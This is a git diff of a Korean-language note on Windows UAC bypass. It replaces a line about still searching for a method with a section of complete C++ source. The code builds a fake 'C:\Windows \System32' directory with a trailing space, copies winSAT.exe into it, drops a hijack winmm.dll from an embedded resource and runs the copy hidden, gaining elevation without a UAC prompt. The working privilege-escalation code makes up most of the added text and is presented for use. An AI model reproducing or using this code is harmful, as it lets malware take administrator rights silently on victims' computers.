@@ -29,6 +29,44 @@ UAC Bypass를 사용한 대표적인 악성코드는 WannaCry가 있다.
 
 또한 윈도우즈 시스템 프로세스는 자체적으로 보안 인증을 통해 UAC Bypass를 지원하고 있으며 이 프로세스에 취약점이 발견될 경우 이를 통해 악성코드가 더 크리티컬한 공격을 감행할 수 있을 것이다.
 
-워너크라이같은 악성코드도 관리자권한을 획득하여 작동하였는데 권한을 얻는 소스가 있었다.
+### UAC Bypass Source
 
-일단 uac창이 안뜨면서 권한 올리는 법을 찾아보는중이다
+```C++
+#include "stdafx.h"
+#include <Windows.h>
+#include "resource.h"
+
+void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
+	HMODULE hMod = GetModuleHandle(NULL);
+	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), rsrcName);
+	DWORD dllSize = SizeofResource(hMod, res);
+	void* dllBuff = LoadResource(hMod, res);
+	HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
+	DWORD sizeOut;
+	WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
+	CloseHandle(hDll);
+}
+
+int main()
+{
+	_SHELLEXECUTEINFOW se = {};
+	//Create Mock SystemRoot Directory
+	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
+	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
+	CopyFileW(L"C:\\Windows\\System32\\winSAT.exe", L"\\\\?\\C:\\Windows \\System32\\winSAT.exe", false);
+
+	//Drop our dll for hijack
+	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\winmm.dll");
+
+	//Execute our winSAT.exe copy from fake trusted directory
+	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
+	se.lpFile =  L"C:\\Windows \\System32\\winSAT.exe";
+	se.lpParameters = L"formal";
+	se.nShow = SW_HIDE;
+	se.hwnd = NULL;
+	se.lpDirectory = NULL;
+	ShellExecuteEx(&se);
+
+    	return 0;
+}
+```
